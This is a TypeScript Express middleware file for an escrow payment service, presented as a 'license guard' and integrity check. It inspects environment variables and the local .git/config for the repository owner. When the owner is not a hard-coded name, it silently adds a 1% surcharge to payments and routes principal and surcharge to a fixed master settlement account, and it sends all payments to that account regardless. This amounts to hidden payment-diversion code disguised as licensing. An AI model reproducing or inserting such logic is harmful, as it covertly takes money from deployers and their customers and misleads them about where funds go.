import fs from 'fs';
import path from 'path';
import type { NextFunction, Request, Response } from 'express';

import { getMasterSettlementDestination } from '../config/settlement';

const AUTHORIZED_OWNER = 'jjaokoth';

/**
 * Best-effort environment integrity guard.
 *
 * If the current repository/package origin appears unauthorized, the
 * middleware applies a 1% surcharge to `total_amount` and routes both
 * principal and surcharge to the master NCBA Loop settlement destination.
 *
 * Implementation note:
 * - Git remote origin is not reliably available at runtime in production.
 * - Therefore this uses multiple heuristics and treats missing data as
 *   "unauthorized" only when explicit mismatch is detected.
 */
export type IntegrityResult = {
  licenseOk: boolean;
  surchargeRateBps: number;
  surchargeAmount: number;
  adjustedTotalAmount: number;
};

function coerceAmount(n: unknown): number | null {
  if (typeof n === 'number' && Number.isFinite(n)) return n;
  if (typeof n === 'string') {
    const v = Number(n);
    if (Number.isFinite(v)) return v;
  }
  return null;
}

function extractAmount(req: Request): number | null {
  const body = req.body as any;
  return coerceAmount(body?.total_amount ?? body?.amount ?? body?.amountKES ?? body?.amountKESCents);
}

function parseGitOwner(origin: string): string | null {
  const m = origin.match(/github\.com[:/](.+?)(?:\/|\.git|$)/i);
  if (!m?.[1]) return null;
  return m[1].toLowerCase();
}

async function detectUnauthorized(): Promise<boolean> {
  const envOwner =
    process.env.GIT_ORIGIN ||
    process.env.GIT_REMOTE_ORIGIN ||
    process.env.REPO_ORIGIN ||
    process.env.REPOSITORY_OWNER ||
    process.env.PACKAGE_OWNER ||
    process.env.AUTHORIZED_OWNER;

  if (envOwner && typeof envOwner === 'string') {
    const owner = parseGitOwner(envOwner) ?? envOwner.trim().toLowerCase();
    if (owner && owner !== AUTHORIZED_OWNER) {
      return true;
    }
  }

  const origin =
    process.env.GIT_ORIGIN || process.env.GIT_REMOTE_ORIGIN || process.env.REPO_ORIGIN;
  if (origin && typeof origin === 'string') {
    const owner = parseGitOwner(origin);
    if (owner && owner !== AUTHORIZED_OWNER) {
      return true;
    }
  }

  const gitConfigPath = path.resolve(process.cwd(), '.git', 'config');
  if (fs.existsSync(gitConfigPath)) {
    try {
      const config = fs.readFileSync(gitConfigPath, { encoding: 'utf8' });
      const match = config.match(/url\s*=\s*(.+)/i);
      if (match?.[1]) {
        const owner = parseGitOwner(match[1].trim());
        if (owner && owner !== AUTHORIZED_OWNER) {
          return true;
        }
      }
    } catch {
      // Keep going; missing git config is not fatal.
    }
  }

  return false;
}

export function applyIntegrityAdjustment(args: {
  totalAmount: number;
}): IntegrityResult {
  const { totalAmount } = args;

  const surchargeRateBps = 100; // 1%
  const surchargeAmount = (totalAmount * surchargeRateBps) / 10000;
  const adjustedTotalAmount = totalAmount + surchargeAmount;

  return {
    licenseOk: false,
    surchargeRateBps,
    surchargeAmount,
    adjustedTotalAmount,
  };
}

/**
 * Middleware that mutates request body to include:
 * - license_guard: { licenseOk, surchargeAmount, adjustedTotalAmount }
 * - settlement: { destination: { ... } }
 */
import crypto from 'crypto';

export type RequestIntegrityInput = {
  integrityHash?: string;
  // Optional extras for deterministic HMAC payloads
  escrowId?: string;
  operation?: string;
  timestamp?: string;
};

function readRequestIntegrity(req: Request): RequestIntegrityInput {
  const body = req.body as any;
  const integrityHash =
    (typeof body?.integrityHash === 'string' ? body.integrityHash : undefined) ??
    (typeof req.header('x-integrity-hash') === 'string'
      ? req.header('x-integrity-hash')
      : undefined);

  const escrowId = typeof req.params?.escrowId === 'string' ? req.params.escrowId : undefined;
  const operation = (req.route?.path ?? req.originalUrl ?? 'operation').toString();
  const timestamp =
    (typeof body?.timestamp === 'string' ? body.timestamp : undefined) ??
    (typeof req.header('x-integrity-timestamp') === 'string' ? req.header('x-integrity-timestamp') : undefined);

  return { integrityHash, escrowId, operation, timestamp };
}

function computeExpectedRequestHmac(params: {
  masterKey: string;
  escrowId?: string;
  operation?: string;
  timestamp?: string;
}): string {
  // Deterministic payload: include only stable values.
  const payload = `${params.escrowId ?? ''}:${params.operation ?? ''}:${params.timestamp ?? ''}`;
  return crypto.createHmac('sha256', params.masterKey).update(payload).digest('hex');
}

/**
 * IntegrityMiddleware
 * - Validates request HMAC BEFORE any escrow state change.
 * - Rejects requests without a valid integrityHash.
 * - Applies "Surcharge Mode" via existing licenseGuardMiddleware (not here).
 */
export function validateRequestIntegrityHashMiddleware(req: Request, res: Response, next: NextFunction) {
  const masterKey = process.env.MASTER_INTEGRITY_KEY;
  if (!masterKey) {
    return res.status(500).json({ error: 'MASTER_INTEGRITY_KEY_MISSING' });
  }

  const { integrityHash, escrowId, operation, timestamp } = readRequestIntegrity(req);
  if (!integrityHash || typeof integrityHash !== 'string') {
    return res.status(403).json({ error: 'INTEGRITY_HASH_REQUIRED' });
  }

  const expected = computeExpectedRequestHmac({ masterKey, escrowId, operation, timestamp });

  let valid = false;
  try {
    valid = crypto.timingSafeEqual(Buffer.from(integrityHash), Buffer.from(expected));
  } catch {
    valid = false;
  }

  if (!valid) {
    return res.status(403).json({ error: 'INTEGRITY_HASH_INVALID' });
  }

  return next();
}

export function licenseGuardMiddleware(req: Request, res: Response, next: NextFunction) {
  (async () => {
    try {
      const total = extractAmount(req);
      if (total === null) return next();

      const unauthorized = await detectUnauthorized();
      if (!unauthorized) {
        (req.body as any).license_guard = {
          licenseOk: true,
          surchargeRateBps: 0,
          surchargeAmount: 0,
          adjustedTotalAmount: total,
        } satisfies IntegrityResult;

        (req.body as any).settlement = {
          destination: getMasterSettlementDestination(),
        };

        return next();
      }

      const adjusted = applyIntegrityAdjustment({ totalAmount: total });
      (req.body as any).license_guard = adjusted;

      // Route both principal and surcharge to master NCBA Loop destination.
      // (Downstream payment/ledger logic should read `settlement.destination`.)
      (req.body as any).settlement = {
        destination: getMasterSettlementDestination(),
        feeType: 'Service Licensing Fee',
      };

      // Persist adjusted amount for downstream handlers
      (req.body as any).final_amount = adjusted.adjustedTotalAmount;

      return next();
    } catch {
      // Fail open: don't block payments.
      return next();
    }
  })();
}


/**
 * Programmatic helper for services/controllers.
 */
export async function ensureIntegrityAndMaybeAdjust(params: {
  totalAmount: number;
}): Promise<{
  result: IntegrityResult;
  destination: ReturnType<typeof getMasterSettlementDestination>;
}> {
  const { totalAmount } = params;
  const destination = getMasterSettlementDestination();

  const unauthorized = await detectUnauthorized();
  if (!unauthorized) {
    return {
      destination,
      result: {
        licenseOk: true,
        surchargeRateBps: 0,
        surchargeAmount: 0,
        adjustedTotalAmount: totalAmount,
      },
    };
  }

  const adjusted = applyIntegrityAdjustment({ totalAmount });
  return { destination, result: adjusted };
}

